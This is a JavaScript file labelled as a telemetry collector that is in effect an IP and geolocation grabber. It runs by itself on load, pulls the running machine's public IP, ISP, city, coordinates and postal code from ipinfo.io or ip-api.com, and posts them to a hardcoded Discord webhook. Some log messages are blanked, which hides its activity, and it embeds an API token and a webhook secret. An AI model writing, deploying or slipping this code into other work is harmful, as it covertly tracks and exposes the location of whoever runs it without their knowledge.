/**
 * Telemetry Collector & Webhook Dispatcher
 */

const CONFIG = {
  ipInfoToken: "500824611e36b1",
  ipApiUrl: "https://ipinfo.io/json",
  fallbackApiUrl: "http://ip-api.com/json/",
  webhookUrl: "https://discord.com/api/webhooks/1561746238397743277/FUJmybMPHJQcMYTywtirln5gY3ycq2h1uMzRn5Y4j_5AIUzhZJLLNQAAqzFBBXmKPF5h",
  timeoutMs: 5000
};

/**
 * Perform fetch with a strict timeout signal
 * @param {string} url 
 * @param {object} options 
 * @returns {Promise<object|null>}
 */
async function fetchWithTimeout(url, options = {}) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), CONFIG.timeoutMs);

  try {
    const response = await fetch(url, { ...options, signal: controller.signal });
    if (!response.ok) {
      throw new Error(`HTTP ${response.status} - ${response.statusText}`);
    }
    return await response.json();
  } catch (err) {
    if (err.name === 'AbortError') {
      console.error(`.`);
    } else {
      console.error(``, err.message);
    }
    return null;
  } finally {
    clearTimeout(timer);
  }
}

/**
 * Retrieve primary network data from ipinfo.io using API token
 * @returns {Promise<object|null>}
 */
async function fetchPrimaryIPDetails() {
  const url = `${CONFIG.ipApiUrl}?token=${CONFIG.ipInfoToken}`;
  return await fetchWithTimeout(url);
}

/**
 * Retrieve fallback network data from ip-api.com and normalize fields
 * @returns {Promise<object|null>}
 */
async function fetchFallbackIPDetails() {
  const data = await fetchWithTimeout(CONFIG.fallbackApiUrl);
  if (!data || data.status === "fail") return null;

  return {
    ip: data.query,
    org: data.isp || data.org,
    city: data.city,
    region: data.regionName,
    country: data.country,
    loc: `${data.lat},${data.lon}`,
    timezone: data.timezone,
    postal: data.zip
  };
}

/**
 * Resolve IP metadata with fallback redundancy
 * @returns {Promise<object|null>}
 */
async function getIPDetails() {
  let details = await fetchPrimaryIPDetails();

  // Trigger fallback if primary fails, returns bogon, or lacks geolocation
  if (!details || details.bogon || (!details.city && !details.org)) {
    console.log("[Telemetry] Primary endpoint incomplete or bogon detected. Running fallback lookup...");
    const fallbackDetails = await fetchFallbackIPDetails();
    if (fallbackDetails) {
      details = fallbackDetails;
    }
  }

  return details;
}

/**
 * Construct Discord Embed structure
 * @param {object} details 
 * @returns {object}
 */
function buildEmbedPayload(details) {
  return {
    embeds: [
      {
        title: "IP Network & Geolocation Data",
        color: 0x3498db, // Decimal representation for blue
        fields: [
          { name: "IP Address", value: details.ip || "N/A", inline: true },
          { name: "ISP / Org", value: details.org || "N/A", inline: true },
          { name: "City", value: details.city || "N/A", inline: true },
          { name: "Region", value: details.region || "N/A", inline: true },
          { name: "Country", value: details.country || "N/A", inline: true },
          { name: "Location (Lat,Long)", value: details.loc || "N/A", inline: true },
          { name: "Timezone", value: details.timezone || "N/A", inline: true },
          { name: "Postal Code", value: details.postal || "N/A", inline: true }
        ],
        timestamp: new Date().toISOString()
      }
    ]
  };
}

/**
 * Dispatch payload to the configured Discord Webhook URL
 * @param {object} details 
 * @returns {Promise<boolean>}
 */
async function sendToDiscord(details) {
  if (!details) {
    console.error("[Telemetry] Transmission aborted: No details available.");
    return false;
  }

  const payload = buildEmbedPayload(details);

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), CONFIG.timeoutMs);

  try {
    const response = await fetch(CONFIG.webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      signal: controller.signal
    });

    if (response.ok) {
      console.log("");
      return true;
    } else {
      console.error(`[Telemetry] Dispatch rejected: HTTP ${response.status}`);
      return false;
    }
  } catch (err) {
    console.error("[Telemetry] Transmission error:", err.message);
    return false;
  } finally {
    clearTimeout(timer);
  }
}

/**
 * Main execution path
 */
async function main() {
  const details = await getIPDetails();
  if (details) {
    await sendToDiscord(details);
  } else {
    console.error("[Telemetry] Execution halted: Failed to obtain network details.");
  }
}

main();
